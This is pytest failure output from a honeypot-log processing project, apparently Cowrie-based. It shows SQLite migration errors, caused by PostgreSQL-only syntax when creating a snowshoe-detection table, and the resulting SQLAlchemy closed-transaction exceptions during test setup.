2025-10-18 17:42:23,067:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:42:23,068:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:42:23,068:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:42:23,071:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:42:23,071:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:42:23,074:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:42:23,074:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:42:23,075:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:42:23,075:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:42:23,076:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:42:23,076:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:42:23,078:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:42:23,078:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:42:23,079:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:42:23,079:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:42:23,082:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:42:23,082:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:42:23,082:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:42:23,082:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:42:23,083:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:42:23,083:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:42:23,085:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:23,085:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:23,085:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:23,085:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:23,086:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:23,086:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:23,086:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:23,086:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:23,087:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:23,087:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:23,089:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 17:42:23,089:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_ ERROR at setup of TestFilesBackfillPerformance.test_concurrent_access_during_backfill _

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_concurrent_access_during_0')

    @pytest.fixture
    def performance_engine(tmp_path):
        """Create database engine optimized for performance testing."""
        db_path = tmp_path / "perf_test.db"
        engine = create_engine_from_settings(load_database_settings())
        # Override with test database path
        from sqlalchemy import create_engine
    
        engine = create_engine(f"sqlite:///{db_path}")
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/performance/test_files_backfill.py:53: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b230ecf0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:42:26,138:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:42:26,138:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:42:26,139:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:42:26,139:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:42:26,146:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:42:26,146:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:42:26,148:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:42:26,148:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:42:26,149:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:42:26,149:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:42:26,151:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:42:26,151:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:42:26,152:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:42:26,152:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:42:26,153:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:42:26,153:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:42:26,154:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:42:26,154:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:42:26,156:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:42:26,156:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:42:26,157:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:42:26,157:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:42:26,160:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:42:26,160:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:42:26,161:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:42:26,161:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:42:26,162:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:42:26,162:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:42:26,163:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:26,163:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:26,164:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:26,164:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:26,166:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:26,166:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:26,167:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:26,167:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:26,167:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:26,167:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:26,168:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 17:42:26,168:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_ ERROR at setup of TestFilesBackfillPerformance.test_large_file_metadata_handling _

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_large_file_metadata_handl0')

    @pytest.fixture
    def performance_engine(tmp_path):
        """Create database engine optimized for performance testing."""
        db_path = tmp_path / "perf_test.db"
        engine = create_engine_from_settings(load_database_settings())
        # Override with test database path
        from sqlalchemy import create_engine
    
        engine = create_engine(f"sqlite:///{db_path}")
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/performance/test_files_backfill.py:53: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b26b2190>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:42:29,179:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:42:29,179:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:42:29,180:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:42:29,180:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:42:29,190:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:42:29,190:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:42:29,191:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:42:29,191:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:42:29,193:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:42:29,193:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:42:29,195:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:42:29,195:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:42:29,196:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
